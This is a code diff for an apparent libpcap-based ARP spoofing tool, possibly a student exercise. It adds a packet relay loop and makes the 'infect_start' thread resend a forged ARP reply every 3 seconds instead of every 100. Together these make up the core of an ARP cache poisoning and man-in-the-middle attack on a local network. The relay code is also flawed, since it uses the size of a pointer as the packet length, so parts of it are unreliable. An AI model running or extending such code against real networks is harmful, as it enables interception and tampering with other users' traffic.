@@ -244,16 +244,34 @@ int main(int argc, char *argv[])
 
         pcap_t *fpp;
 
-        //---------------------------------------------------------------------------------------send reply arp
+        //---------------------------------------------------------------------------------------send infection reply arp
         fpp=pcap_open_live(dev,BUFSIZ,0,1,errbuf);
         if(fpp==NULL)
         {
             printf("%s\n",errbuf);
             return 0;
         }
+        //---------------------------------------------------------------------------------------send relay
+
+       int relay;
+        while((relay=pcap_next_ex(fp, &header, &pkt_data))>=0)
+        {
+            if(relay==1)
+            {
+                pcap_sendpacket(fp,pkt_data,sizeof(pkt_data));
+            }
+            else if(relay==0)
+                continue;
+        }
+
+        //----------------------------------------------------------send infection
         std :: thread infect(&infect_start,fpp,packet);
+        //here in relay;
         infect.join();
-  }
+
+
+}
+
 //=========================================================================================
 
 
@@ -273,11 +291,10 @@ void make_t_mac(const u_char *pkt_data, u_int8_t a[], char *b)//아이피를 비
 }
 void infect_start(pcap_t *a,uint8_t b[])
 {
-
     while(a!=NULL)
     {
         pcap_sendpacket(a,(u_char*)b,42);
 
-        sleep(100);//recover test
+        sleep(3);//recover test
     }
 }
